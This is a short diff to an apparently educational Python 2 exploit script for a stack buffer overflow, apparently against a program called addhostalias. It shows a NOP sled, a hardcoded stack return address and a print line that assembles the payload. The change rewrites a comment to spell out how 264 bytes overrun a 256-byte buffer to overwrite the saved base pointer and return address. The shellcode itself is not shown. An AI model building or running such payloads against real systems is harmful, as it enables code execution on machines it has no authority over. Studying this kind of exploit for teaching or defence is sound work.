@@ -15,5 +15,5 @@ nops = nop*181
 # estimated area of the end of the stack
 nop_adress = '\x10\xf9\xff\xbf'
 
-# 181 + 75 + 2 + 4 = 262 + 2 characters in printf = 264 bytes of data (instead of 256, so it will overwrite base pointer and return address)
+# 181 (NOPs) + 75 (Shellcode) + 2 (separators between addhostalias arguments) + 2 (last 2 bytes for base pointer occupied by 2 NOPs)+ 4 (return address) = 264 bytes of data (instead of 256, so it will overwrite the base pointer and the return address)
 print nops+shellcode,nop*2,nop_adress
